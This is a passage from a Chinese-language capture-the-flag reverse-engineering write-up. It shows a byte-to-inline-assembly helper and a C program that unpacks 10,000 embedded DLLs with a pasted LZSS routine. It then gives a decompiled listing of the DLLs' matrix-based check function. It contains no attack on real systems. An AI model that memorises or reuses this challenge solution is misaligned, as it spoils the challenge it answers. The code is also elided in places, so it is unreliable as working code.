<p>提取后同构两个函数并解压所有dll，由于原解压函数十分复杂，所以可以直接粘贴ida的反编译代码，发现计算长度的函数不用改就能用，但是解压缩的函数会报错，所以可以采用直接粘贴字节码的方式：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asm volatile (&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;    \&quot;.byte <span class="subst">&#123;<span class="built_in">hex</span>(code[i])&#125;</span>\\n\\t\&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;    :</span></span><br><span class="line"><span class="string">    :</span></span><br><span class="line"><span class="string">    : &quot;eax&quot;, &quot;cc&quot;</span></span><br><span class="line"><span class="string">);&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>主程序：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((naked)) <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">LZSS_decompress</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">char</span> *zipfile,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">char</span> *dllfile,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">long</span> <span class="type">long</span> compressed_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">long</span> <span class="type">long</span> decompress_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">long</span> <span class="type">long</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;.byte 0x55\n\t&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;.byte 0x48\n\t&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;.byte 0x81\n\t&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      ...</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;.byte 0x0\n\t&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;.byte 0x5d\n\t&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;.byte 0xc3\n\t&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      :</span></span></span><br><span class="line"><span class="params"><span class="function">      :</span></span></span><br><span class="line"><span class="params"><span class="function">      : <span class="string">&quot;eax&quot;</span>, <span class="string">&quot;cc&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">create_dir</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path)</span> </span>&#123;</span><br><span class="line">    _mkdir(path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *input_dir = <span class="string">&quot;bins&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *output_dir = <span class="string">&quot;dlls&quot;</span>;</span><br><span class="line">    <span class="built_in">create_dir</span>(output_dir);</span><br><span class="line">    <span class="type">char</span> search_path[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(search_path, <span class="built_in">sizeof</span>(search_path), <span class="string">&quot;%s\\dll_*.bin&quot;</span>, input_dir);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_finddata_t</span> file_info;</span><br><span class="line">    <span class="type">intptr_t</span> handle = _findfirst(search_path, &amp;file_info);</span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No dll_*.bin files found in %s/\n&quot;</span>, input_dir);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> mismatch_list[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_info.attrib &amp; _A_SUBDIR)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">char</span> *start = <span class="built_in">strstr</span>(file_info.name, <span class="string">&quot;dll_&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!start) <span class="keyword">continue</span>;</span><br><span class="line">        start += <span class="number">4</span>;</span><br><span class="line">        <span class="type">char</span> *end = <span class="built_in">strstr</span>(start, <span class="string">&quot;.bin&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!end) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">char</span> num_str[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">strncpy</span>(num_str, start, end - start);</span><br><span class="line">        num_str[end - start] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="type">int</span> idx = <span class="built_in">atoi</span>(num_str);</span><br><span class="line">        <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">char</span> input_path[<span class="number">256</span>];</span><br><span class="line">        <span class="built_in">snprintf</span>(input_path, <span class="built_in">sizeof</span>(input_path), <span class="string">&quot;%s\\%s&quot;</span>, input_dir, file_info.name);</span><br><span class="line">        FILE *fp = <span class="built_in">fopen</span>(input_path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s\n&quot;</span>, input_path);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> file_size = <span class="built_in">ftell</span>(fp);</span><br><span class="line">        <span class="built_in">rewind</span>(fp);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *buffer = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(file_size);</span><br><span class="line">        <span class="keyword">if</span> (!buffer) &#123;</span><br><span class="line">            <span class="built_in">fclose</span>(fp);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Malloc failed for %s\n&quot;</span>, input_path);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">size_t</span> read_bytes = <span class="built_in">fread</span>(buffer, <span class="number">1</span>, file_size, fp);</span><br><span class="line">        <span class="built_in">fclose</span>(fp);</span><br><span class="line">        <span class="keyword">if</span> (read_bytes != (<span class="type">size_t</span>)file_size) &#123;</span><br><span class="line">            <span class="built_in">free</span>(buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Read error for %s\n&quot;</span>, input_path);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> expected_size = <span class="built_in">get_decompress_size</span>(buffer, file_size, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Processing %s -&gt; expected size: 0x%llx\n&quot;</span>, file_info.name, expected_size);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *output = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(expected_size + <span class="number">4096</span>);</span><br><span class="line">        <span class="keyword">if</span> (!output) &#123;</span><br><span class="line">            <span class="built_in">free</span>(buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Output malloc failed for %s\n&quot;</span>, input_path);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> actual_size = <span class="built_in">LZSS_decompress</span>(buffer, output, file_size, expected_size, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (actual_size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Decompression failed for %s (error code %lld)\n&quot;</span>, file_info.name, actual_size);</span><br><span class="line">            <span class="built_in">snprintf</span>(mismatch_list + <span class="built_in">strlen</span>(mismatch_list), <span class="built_in">sizeof</span>(mismatch_list) - <span class="built_in">strlen</span>(mismatch_list),</span><br><span class="line">                     <span class="string">&quot;%s (decompress error)\n&quot;</span>, file_info.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)actual_size != expected_size) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Size mismatch for %s: expected=0x%llx, actual=0x%llx\n&quot;</span>,</span><br><span class="line">                   file_info.name, expected_size, (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)actual_size);</span><br><span class="line">            <span class="built_in">snprintf</span>(mismatch_list + <span class="built_in">strlen</span>(mismatch_list), <span class="built_in">sizeof</span>(mismatch_list) - <span class="built_in">strlen</span>(mismatch_list),</span><br><span class="line">                     <span class="string">&quot;%s\n&quot;</span>, file_info.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span> output_name[<span class="number">256</span>];</span><br><span class="line">            <span class="built_in">snprintf</span>(output_name, <span class="built_in">sizeof</span>(output_name), <span class="string">&quot;%s\\%04d.dll&quot;</span>, output_dir, idx);</span><br><span class="line">            FILE *out_fp = <span class="built_in">fopen</span>(output_name, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (out_fp) &#123;</span><br><span class="line">                <span class="built_in">fwrite</span>(output, <span class="number">1</span>, expected_size, out_fp);</span><br><span class="line">                <span class="built_in">fclose</span>(out_fp);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;  -&gt; Written to %s\n&quot;</span>, output_name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Failed to write %s\n&quot;</span>, output_name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(buffer);</span><br><span class="line">        <span class="built_in">free</span>(output);</span><br><span class="line">    &#125; <span class="keyword">while</span> (_findnext(handle, &amp;file_info) == <span class="number">0</span>);</span><br><span class="line">    _findclose(handle);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(mismatch_list) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n=== Files with size mismatch or errors ===\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, mismatch_list);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nAll files decompressed successfully with matching sizes.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提取后得到10000个dll</p>
<h2 id="9-3-初步分析dll-check函数模式-自动化提取"><a href="#9-3-初步分析dll-check函数模式-自动化提取" class="headerlink" title="#9.3 初步分析dll check函数模式 &amp;&amp; 自动化提取"></a>#9.3 初步分析dll check函数模式 &amp;&amp; 自动化提取</h2><p>发现其中每个dll均有数百个名为<font color=lime><strong>fxxxxxxxxxxxxxx</strong></font>的单个校验函数导出，check函数均遵循格式：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">check</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, __m128 a2, __int64 a3, __int64 a4, __int64 a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  数百个fxxxxxxxxxxxxxxx混合，有的来自别的<span class="built_in">dll</span>(a1);</span><br><span class="line">  <span class="number">22</span>行密文，其中第<span class="number">4</span>、<span class="number">6</span>、<span class="number">8</span>、<span class="number">10</span>行是<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( n15 = <span class="number">0</span>; n15 &lt;= <span class="number">15</span>; ++n15 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v98[<span class="number">2</span> * n15 + <span class="number">121</span>];</span><br><span class="line">    v6 = &amp;v98[<span class="number">2</span> * n15 + <span class="number">120</span>];</span><br><span class="line">    *v6 ^= *(_QWORD *)(<span class="number">8LL</span> * (n15 % <span class="number">4</span>) + a5);</span><br><span class="line">    v6[<span class="number">1</span>] = v5;</span><br><span class="line">    <span class="keyword">if</span> ( *(_OWORD *)&amp;v98[<span class="number">2</span> * n15 + <span class="number">120</span>] &gt;= v123 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  一些xmm验证函数的调用;</span><br><span class="line">  <span class="keyword">if</span> ( *(_OWORD *)&amp;a2 == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  Size[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Size[<span class="number">1</span>], <span class="number">0</span>, <span class="number">72</span>);</span><br><span class="line">  Size[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Size[<span class="number">11</span>], <span class="number">0</span>, <span class="number">72</span>);</span><br><span class="line">  Size[<span class="number">20</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Size[<span class="number">21</span>], <span class="number">0</span>, <span class="number">72</span>);</span><br><span class="line">  Size[<span class="number">30</span>] = <span class="number">1</span>;</span><br><span class="line">  Size[<span class="number">31</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v98[<span class="number">24</span>], <span class="number">0</span>, <span class="number">512</span>);</span><br><span class="line">  <span class="keyword">for</span> ( n15_1 = <span class="number">0</span>; n15_1 &lt;= <span class="number">15</span>; ++n15_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v44 = v98[<span class="number">2</span> * n15_1 + <span class="number">121</span>];</span><br><span class="line">    v45 = &amp;v98[<span class="number">2</span> * n15_1 + <span class="number">56</span>];</span><br><span class="line">    *v45 = v98[<span class="number">2</span> * n15_1 + <span class="number">120</span>];</span><br><span class="line">    v45[<span class="number">1</span>] = v44;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( n63 = <span class="number">0</span>; n63 &lt;= <span class="number">63</span>; ++n63 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v122 &gt;&gt; n63) &amp; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( n3_2 = <span class="number">0</span>; n3_2 &lt;= <span class="number">3</span>; ++n3_2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( n3_1 = <span class="number">0</span>; n3_1 &lt;= <span class="number">3</span>; ++n3_1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v46 = &amp;v98[<span class="number">8</span> * n3_2 + <span class="number">24</span> + <span class="number">2</span> * n3_1];</span><br><span class="line">          *v46 = <span class="number">0</span>;</span><br><span class="line">          v46[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">          n3 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( n3 &lt;= <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v47 = v98[<span class="number">8</span> * n3_2 + <span class="number">24</span> + <span class="number">2</span> * n3_1];</span><br><span class="line">            v48 = v98[<span class="number">8</span> * n3_2 + <span class="number">25</span> + <span class="number">2</span> * n3_1];</span><br><span class="line">            v49 = v98[<span class="number">8</span> * n3_2 + <span class="number">88</span> + <span class="number">2</span> * n3];</span><br><span class="line">            v50 = v98[<span class="number">8</span> * n3 + <span class="number">56</span> + <span class="number">2</span> * n3_1];</span><br><span class="line">            v51 = v50 * v98[<span class="number">8</span> * n3_2 + <span class="number">89</span> + <span class="number">2</span> * n3] + v49 * v98[<span class="number">8</span> * n3 + <span class="number">57</span> + <span class="number">2</span> * n3_1];</span><br><span class="line">            v52 = v50 * (<span class="type">unsigned</span> __int128)v49;</span><br><span class="line">            *((_QWORD *)&amp;v52 + <span class="number">1</span>) += v51;</span><br><span class="line">            v89 = v52;</span><br><span class="line">            v88 = v123;</span><br><span class="line">            *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3258D0990</span>(v48, v47, &amp;v88, &amp;v89);</span><br><span class="line">            *(_QWORD *)&amp;v53 = v47;</span><br><span class="line">            *((_QWORD *)&amp;v53 + <span class="number">1</span>) = v48;</span><br><span class="line">            v54 = <span class="number">16LL</span> * (<span class="number">4</span> * n3_2 + n3_1) + <span class="number">1328</span>;</span><br><span class="line">            *(_OWORD *)((<span class="type">char</span> *)&amp;v98[<span class="number">-142</span>] + v54) = *(_OWORD *)&amp;a2 + v53;</span><br><span class="line">            v55 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">4</span> * n3_2 + n3_1);</span><br><span class="line">            v89 = *(_OWORD *)&amp;v98[<span class="number">8</span> * n3_2 + <span class="number">24</span> + <span class="number">2</span> * n3_1];</span><br><span class="line">            v88 = v123;</span><br><span class="line">            *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3258D0990</span>(v54, v55, &amp;v88, &amp;v89);</span><br><span class="line">            *(__m128 *)&amp;v98[<span class="number">2</span> * (<span class="type">int</span>)v55 + <span class="number">24</span>] = a2;</span><br><span class="line">            ++n3;</span><br><span class="line">            Buf2 = __PAIR128__(v98, v55);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( n15_2 = <span class="number">0</span>; n15_2 &lt;= <span class="number">15</span>; ++n15_2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v56 = v98[<span class="number">2</span> * n15_2 + <span class="number">25</span>];</span><br><span class="line">        v57 = <span class="number">16LL</span> * n15_2 + <span class="number">1328</span>;</span><br><span class="line">        v58 = (_QWORD *)((<span class="type">char</span> *)&amp;v98[<span class="number">-78</span>] + v57);</span><br><span class="line">        *v58 = *(_QWORD *)((<span class="type">char</span> *)&amp;v98[<span class="number">-142</span>] + v57);</span><br><span class="line">        v58[<span class="number">1</span>] = v56;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n3_5 = <span class="number">0</span>; n3_5 &lt;= <span class="number">3</span>; ++n3_5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( n3_4 = <span class="number">0</span>; n3_4 &lt;= <span class="number">3</span>; ++n3_4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v59 = &amp;v98[<span class="number">8</span> * n3_5 + <span class="number">24</span> + <span class="number">2</span> * n3_4];</span><br><span class="line">        *v59 = <span class="number">0</span>;</span><br><span class="line">        v59[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        n3_3 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( n3_3 &lt;= <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v60 = v98[<span class="number">8</span> * n3_5 + <span class="number">24</span> + <span class="number">2</span> * n3_4];</span><br><span class="line">          v61 = v98[<span class="number">8</span> * n3_5 + <span class="number">25</span> + <span class="number">2</span> * n3_4];</span><br><span class="line">          v62 = v98[<span class="number">8</span> * n3_5 + <span class="number">56</span> + <span class="number">2</span> * n3_3];</span><br><span class="line">          v63 = v98[<span class="number">8</span> * n3_3 + <span class="number">56</span> + <span class="number">2</span> * n3_4];</span><br><span class="line">          v64 = v63 * v98[<span class="number">8</span> * n3_5 + <span class="number">57</span> + <span class="number">2</span> * n3_3] + v62 * v98[<span class="number">8</span> * n3_3 + <span class="number">57</span> + <span class="number">2</span> * n3_4];</span><br><span class="line">          v65 = v63 * (<span class="type">unsigned</span> __int128)v62;</span><br><span class="line">          *((_QWORD *)&amp;v65 + <span class="number">1</span>) += v64;</span><br><span class="line">          v89 = v65;</span><br><span class="line">          v88 = v123;</span><br><span class="line">          *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3258D0990</span>(v61, v60, &amp;v88, &amp;v89);</span><br><span class="line">          *(_QWORD *)&amp;v66 = v60;</span><br><span class="line">          *((_QWORD *)&amp;v66 + <span class="number">1</span>) = v61;</span><br><span class="line">          v67 = <span class="number">16LL</span> * (<span class="number">4</span> * n3_5 + n3_4) + <span class="number">1328</span>;</span><br><span class="line">          *(_OWORD *)((<span class="type">char</span> *)&amp;v98[<span class="number">-142</span>] + v67) = *(_OWORD *)&amp;a2 + v66;</span><br><span class="line">          v68 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">4</span> * n3_5 + n3_4);</span><br><span class="line">          v89 = *(_OWORD *)&amp;v98[<span class="number">8</span> * n3_5 + <span class="number">24</span> + <span class="number">2</span> * n3_4];</span><br><span class="line">          v88 = v123;</span><br><span class="line">          *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3258D0990</span>(v67, v68, &amp;v88, &amp;v89);</span><br><span class="line">          *(__m128 *)&amp;v98[<span class="number">2</span> * (<span class="type">int</span>)v68 + <span class="number">24</span>] = a2;</span><br><span class="line">          ++n3_3;</span><br><span class="line">          Buf2 = __PAIR128__(v98, v68);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n15_3 = <span class="number">0</span>; n15_3 &lt;= <span class="number">15</span>; ++n15_3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v69 = v98[<span class="number">2</span> * n15_3 + <span class="number">25</span>];</span><br><span class="line">      v70 = <span class="number">16LL</span> * n15_3 + <span class="number">1328</span>;</span><br><span class="line">      v71 = (_QWORD *)((<span class="type">char</span> *)&amp;v98[<span class="number">-110</span>] + v70);</span><br><span class="line">      *v71 = *(_QWORD *)((<span class="type">char</span> *)&amp;v98[<span class="number">-142</span>] + v70);</span><br><span class="line">      v71[<span class="number">1</span>] = v69;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  一些数据</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(*((<span class="type">const</span> <span class="type">void</span> **)&amp;Buf2 + <span class="number">1</span>), (<span class="type">const</span> <span class="type">void</span> *)Buf2, (<span class="type">size_t</span>)Size) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过外部调用的fxxxxxxxx函数名称，发现dll名字顺序与资源顺序相同，编写脚本提取所有dll的导出表：</p>
